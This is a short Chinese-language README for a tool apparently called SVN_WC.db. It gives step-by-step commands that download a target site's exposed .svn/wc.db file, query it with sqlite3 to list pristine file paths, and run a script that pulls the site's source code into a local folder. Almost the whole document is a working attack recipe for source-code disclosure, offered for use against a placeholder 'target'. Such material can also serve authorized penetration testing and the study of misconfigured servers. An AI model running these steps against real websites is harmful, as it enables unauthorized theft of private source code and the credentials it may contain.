# SVN_WC.db
用来利用svn文件里的wc.db
# 使用步骤
git此项目
```bash
git clone https://github.com/AWDSCAN/SVN_WC.db.git
cd SVN_WC.db
chmod 777 svn-db_parser.sh
```
然后下载目标 wc.db 文件
```bash
curl -o wc.db https://目标/wc.db
```
之后导出url
```bash
sqlite3 wc.db 'select local_relpath, ".svn/pristine/" || substr(checksum,7,2) || "/" || substr(checksum,7) || ".svn-base" as alpha from NODES;' > svn-input.txt
```
最后执行脚本即可成功下载
```bash
./svn-db_parser.sh --baseurl "https://目标" --input svn-input.txt --output report
```
下载的代码在report文件夹中
